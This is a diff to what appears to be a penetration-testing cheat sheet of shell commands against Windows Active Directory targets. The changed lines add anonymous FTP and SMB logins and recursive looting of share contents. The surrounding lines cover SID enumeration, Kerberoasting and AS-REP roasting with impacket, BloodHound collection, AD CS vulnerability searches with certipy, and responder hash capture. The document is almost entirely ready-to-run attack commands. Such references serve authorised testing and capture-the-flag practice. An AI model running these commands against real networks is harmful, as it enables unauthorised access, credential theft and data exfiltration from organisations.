@@ -169,9 +169,9 @@ nmap $TARGET --script "ssl* and not brute" -p 443
 nmap $TARGET --script "ldap* and not brute" -p 389 | grep -Ei 'dnsHostName' | cut -d ':' -f2 | xargs
 KDOM=$(bash -c 'echo "${0^^}"' $DOM);KDC=$(bash -c 'echo "${0^^}"' $DC); echo -e "[libdefaults]\n default_realm = $KDOM\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n $KDOM = {\n  kdc = $KDC\n  admin_server = $KDC\n }\n\n[domain_realm]\n .$DOM = $KDOM\n $DOM = $KDOM" | sudo tee /etc/krb5.conf
 echo "$TARGET $DC $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
-wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
+nxc ftp "$TARGET" -u 'anonymous' -p '' --ls
+wget ftp://$TARGET --ftp-user='anonymous' --ftp-password='' -np -nH -m -q -P ftp
+nxc smb "$TARGET" -u 'anonymous' -p '' --shares
 smbme $TARGET
 mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
@@ -214,9 +214,10 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-nxc ldap $TARGET --dns-server $TARGET --use-kcache -M adcs
-nxc ldap $TARGET --dns-server $TARGET --use-kcache --bloodhound -c all
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound --use-kcache
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs --use-kcache
+nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --shares --use-kcache
+mkdir smb; smbclient //$TARGET/SHARE_NAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
 certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
 sudo responder -I tun0 -v
